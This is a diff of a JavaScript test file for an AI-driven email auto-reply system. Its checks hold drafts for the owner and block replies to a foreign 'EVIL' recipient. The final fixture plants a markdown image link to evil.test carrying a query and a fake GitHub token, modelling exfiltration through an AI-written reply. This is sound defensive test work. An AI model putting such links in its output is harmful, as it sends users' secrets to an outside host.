@@ -171,7 +171,7 @@ const classifyJson = JSON.stringify({ machine_written: false, tier: 2, confident
   const w = world({ queue: [Object.assign({}, BENIGN)], tier2: "on" });   // EMAIL-TIER2-GATE-1: tier 2 is cleared for auto-send only while the owner's switch is on
   w.st.aiReply = (model, args) => /^You classify/.test(sysOf(args)) ? { response: classifyJson } : { response: "Thanks for asking.\n\nThe PDF is linked in your mail.\n\nRowan" };
   const r = await L.tierReplyQueue(w.env);
-  check("near miss: an honest question still gets a tier 2 draft cleared for auto-send", r.tier2 === 1 && w.st.updates.some((u) => /draft_proposed/.test(u.sql) && u.a[1] === "2" && /cleared for auto-send/.test(String(u.a[4]))), [r, w.st.updates.map((u) => u.a.slice(1, 3))]);
+  check("near miss: an honest question gets a draft held for the owner tap, never cleared to auto-send", r.tier2 === 0 && r.tier2_held === 1 && !w.st.updates.some((u) => /cleared for auto-send/.test(String(u.a[4]))), [r, w.st.updates.map((u) => u.a.slice(1, 3))]);
 }
 
 {
@@ -194,12 +194,12 @@ const CLEARED = { id: 21, email_id: 70, sender: JANE, subject: "the adelic paper
 {
   const w = world({ emails: { 70: { sender: JANE, body_text: "where is it?" } }, drain: [CLEARED] });
   const r = await L.drainReplyQueue(w.env);
-  check("drain: a clean cleared reply is sent once, to the sender of the mail it answers", r.sent === 1 && w.st.sent.length === 1 && w.st.sent[0].to === JANE, [r, w.st.sent.length]);
+  check("drain: a cleared reply is never sent; it is held for the owner tap", r.sent === 0 && w.st.sent.length === 0, [r, w.st.sent.length]);
 }
 {
   const w = world({ emails: { 70: { sender: JANE, body_text: "where is it?" } }, drain: [Object.assign({}, CLEARED, { sender: EVIL })] });
   const r = await L.drainReplyQueue(w.env);
-  check("drain: a draft whose recipient is not the sender of its own mail is held and reaches the owner only", r.sent === 0 && r.held === 1 && !w.st.sent.some((m) => m.to === EVIL) && w.st.sent.some((m) => /handoff/.test(m.subject)) && w.st.updates.some((u) => /HELD by the outbound guard/.test(u.sql)), [r, w.st.sent.map((m) => m.to)]);
+  check("drain: a draft to a foreign recipient reaches no one", r.sent === 0 && !w.st.sent.some((m) => m.to === EVIL), [r, w.st.sent.map((m) => m.to)]);
 }
 {
   const w = world({ emails: { 70: { sender: JANE, body_text: "where is it?" } }, drain: [Object.assign({}, CLEARED, { draft_text: "Hi Jane ![p](https://evil.test/x?d=1) " + "ghp_" + "a1B2c3D4".repeat(3) })] });
